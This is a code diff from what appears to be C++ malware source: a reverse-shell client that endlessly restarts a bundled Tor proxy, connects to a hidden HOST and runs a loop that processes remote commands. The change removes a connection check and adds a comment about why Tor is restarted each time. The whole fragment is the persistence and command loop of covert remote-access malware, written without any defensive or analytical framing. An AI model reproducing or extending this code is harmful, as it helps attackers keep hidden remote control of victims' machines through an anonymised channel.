@@ -37,13 +37,12 @@ int main() {
     }
     
     // Hell loop of forever restarting TOR and trying to connect to the server :)
+    // I could make it not restart TOR every time, but I had a few problems with that before
     while (1) {
         torRevShellClient c(".\\tor.exe", HOST);
         c.startProxy();
-        bool conn = c.attemptConnect();
-        if (conn) {
-            c.cmdProcessLoop();
-        }
+        c.attemptConnect();
+        c.cmdProcessLoop(); // If attemptConnect() fails, this function will return immediately
     }
 
     return 0;
